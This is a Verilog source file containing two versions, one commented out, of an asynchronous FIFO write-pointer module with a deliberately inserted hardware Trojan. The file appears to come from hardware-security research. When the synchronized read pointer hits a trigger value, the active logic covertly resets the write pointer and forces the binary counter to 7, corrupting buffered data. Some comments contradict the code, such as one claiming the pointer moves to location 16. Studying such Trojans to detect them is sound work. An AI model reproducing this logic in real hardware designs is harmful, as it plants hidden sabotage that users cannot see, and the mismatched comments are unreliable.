/*module wptr_full_trojan #(parameter ADDRSIZE = 4) (
    output reg wfull,
    output [ADDRSIZE-1:0] waddr,
    output reg [ADDRSIZE:0] wptr,
    input [ADDRSIZE:0] wq2_rptr,
    input winc, wclk, wrst_n, t_rst
);

    reg [ADDRSIZE:0] wbin, wbinnext;
    reg [ADDRSIZE:0] wptr_trojan; // Trojan output
    wire [ADDRSIZE:0] wgraynext;
    wire wfull_val;

    // Memory write-address pointer
    assign waddr = wbin[ADDRSIZE-1:0];
    
    // Calculate next binary and gray pointer values
    always @(*) begin
        if (winc && !wfull) begin
            wbinnext = wbin + 1;
        end else begin
            wbinnext = wbin;
        end
    end

    // Convert binary to gray code for the next pointer
    assign wgraynext = (wbinnext >> 1) ^ wbinnext;

    // Full condition check
    assign wfull_val = (wgraynext == {~wq2_rptr[ADDRSIZE:ADDRSIZE-1], wq2_rptr[ADDRSIZE-2:0]});
    
    // Sequential block for updating wfull
    always @(posedge wclk or negedge wrst_n) begin
        if (!wrst_n) begin
            wfull <= 1'b0;
        end else begin
            wfull <= wfull_val;
        end
    end

    // Sequential block for pointers and Trojan logic
    always @(posedge wclk or negedge wrst_n) begin
        if (!wrst_n) begin
            wptr <= 0;
            wbin <= 0;
            wptr_trojan <= 0;
        end else if (t_rst) begin
            wptr_trojan <= 5'b00000;
        end else if (wptr == 5'b00101 && wq2_rptr == 5'b00001) begin
            wptr_trojan <= 5'b00000;
            wbin <= 0;
        end else begin
            wptr <= wptr_trojan;
            wbin <= wbinnext;  // Update wbin based on the calculated next value
            wptr_trojan <= wgraynext;  // Update Trojan pointer with next gray value
        end
    end

endmodule*/

module wptr_full_trojan #(parameter ADDRSIZE = 4) (
    output reg wfull,
    output [ADDRSIZE-1:0] waddr,
    output reg [ADDRSIZE:0] wptr,
    input [ADDRSIZE:0] wq2_rptr,
    input winc, wclk, wrst_n, t_rst
);

    reg [ADDRSIZE:0] wbin, wbinnext;
    reg [ADDRSIZE:0] wptr_trojan; // Trojan output
    wire [ADDRSIZE:0] wgraynext;
    wire wfull_val;

    // Memory write-address pointer
    assign waddr = wbin[ADDRSIZE-1:0];
    
    // Binary to Gray code conversion for next pointer
    assign wgraynext = (wbinnext >> 1) ^ wbinnext;

    // Full condition check
    assign wfull_val = (wgraynext == {~wq2_rptr[ADDRSIZE:ADDRSIZE-1], wq2_rptr[ADDRSIZE-2:0]});

    always @(*) begin
        if (winc && !wfull) begin
            wbinnext = wbin + 1; // Normal increment
        end else begin
            wbinnext = wbin; // No change
        end
    end

    // Sequential block to control the write pointer and full flag
    always @(posedge wclk or negedge wrst_n) begin
        if (!wrst_n) begin
            wptr <= 0;
            wbin <= 0;
            wfull <= 1'b0;
            wptr_trojan <= 0;
        end else begin
            // Check custom conditions to manipulate wptr directly
            if (t_rst) begin
                wptr_trojan <= 5'b00000; // Reset Trojan pointer
            end else if (wq2_rptr == 5'b00001) begin
                wptr_trojan <= 5'b00000; // Example: move wptr to location 16 when wq2_rptr is at 1
                wbin <= 7; // Also set the binary pointer accordingly
            end else begin
                wptr_trojan <= wgraynext; // Default behavior: normal Gray code increment
                wbin <= wbinnext; // Normal binary increment
            end

            // Update the write pointer to the Trojan or calculated value
            wptr <= wptr_trojan;

            // Update full flag
            wfull <= wfull_val;
        end
    end

endmodule

